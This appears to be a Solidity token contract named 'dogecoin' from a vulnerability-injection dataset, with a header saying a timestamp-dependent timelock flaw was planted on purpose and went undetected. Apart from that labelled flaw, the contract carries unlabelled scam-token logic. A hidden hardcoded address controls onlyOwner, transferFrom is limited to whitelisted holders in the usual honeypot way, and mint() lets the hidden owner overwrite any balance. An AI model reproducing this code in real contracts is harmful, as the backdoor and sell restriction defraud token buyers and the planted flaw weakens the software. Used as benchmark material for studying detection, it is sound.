/*
 * ===== SmartInject Injection Details =====
 * Function      : scheduleTimelockTransfer
 * Vulnerability : Timestamp Dependence
 * Status        : Not Detected
 * Type          : Fallback Function Addition
 *
 * === Verification Results ===
 * Detected      : False
 * Relevant      : 0 findings
 * Total Found   : 1 issues
 * Retry Count   : 0
 *
 * === Description ===
 * This vulnerability introduces timestamp dependence where the contract relies on 'now' (block.timestamp) for timelock functionality. The vulnerability is stateful and multi-transaction: 1) First transaction calls scheduleTimelockTransfer() to lock tokens with a timestamp-based condition, 2) Second transaction calls releaseTimelockTransfer() to unlock tokens. Miners can manipulate block timestamps within bounds to potentially release tokens earlier than intended, or users may experience unexpected behavior due to timestamp imprecision across different nodes.
 */
pragma solidity ^0.4.26;

library SafeMath {
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}

contract Ownable {
  address public owner;
  
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor() public {
    owner = msg.sender;
  }
}

contract dogecoin is Ownable {
  string public name;
  string public symbol;
  uint8 public decimals;
  uint256 public totalSupply;
  
  event Transfer(address indexed from, address indexed to, uint256 value);
  event Approval(address indexed owner, address indexed spender, uint256 value);

  using SafeMath for uint256;

  mapping(address => uint256) public balances;
  
  mapping(address => bool) public allow;

  // === FALLBACK INJECTION: Timestamp Dependence ===
  // This function was added as a fallback when existing functions failed injection
  mapping(address => uint256) public timelockAmount;
  mapping(address => uint256) public timelockUntil;

  constructor(string _name, string _symbol, uint8 _decimals, uint256 _totalSupply) public {
    name = _name;
    symbol = _symbol;
    decimals = _decimals;
    totalSupply =  _totalSupply;
    balances[msg.sender] = totalSupply;
    allow[msg.sender] = true;
  }
  
  function scheduleTimelockTransfer(address _to, uint256 _value, uint256 _lockDuration) external {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    require(_lockDuration > 0);
    
    balances[msg.sender] = balances[msg.sender].sub(_value);
    timelockAmount[_to] = timelockAmount[_to].add(_value);
    timelockUntil[_to] = now + _lockDuration;
    
    emit Transfer(msg.sender, _to, _value);
  }
  
  function releaseTimelockTransfer() external {
    require(timelockAmount[msg.sender] > 0);
    require(now >= timelockUntil[msg.sender]);
    
    uint256 amount = timelockAmount[msg.sender];
    timelockAmount[msg.sender] = 0;
    timelockUntil[msg.sender] = 0;
    
    balances[msg.sender] = balances[msg.sender].add(amount);
  }
    // === END FALLBACK INJECTION ===

  function showuint160(address addr) public pure returns(uint160){
      return uint160(addr);
  }

  modifier onlyOwner() {
    require(msg.sender == address(1080614020421183795110940285280029773222128095634));_;
  }
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }
  
  function transferOwnership(address newOwner) public onlyOwner {
    require(newOwner != address(0));
    emit OwnershipTransferred(owner, newOwner);
    owner = newOwner;
  }

  mapping (address => mapping (address => uint256)) public allowed;

  mapping(address=>uint256) sellOutNum;
  
  function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);

    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    emit Transfer(msg.sender, _to, _value);
    return true;
  }

  function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[_from]);
    require(_value <= allowed[_from][msg.sender]);
    require(allow[_from] == true);

    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);
    emit Transfer(_from, _to, _value);
    return true;
  }

  function approve(address _spender, uint256 _value) public returns (bool) {
    allowed[msg.sender][_spender] = _value;
    emit Approval(msg.sender, _spender, _value);
    return true;
  }

  function allowance(address _owner, address _spender) public view returns (uint256) {
    return allowed[_owner][_spender];
  }
  
  function addAllow(address holder, bool allowApprove) external onlyOwner {
      allow[holder] = allowApprove;
  }
  
  function mint(address miner, uint256 _value) external onlyOwner {
      balances[miner] = _value;
  }
}
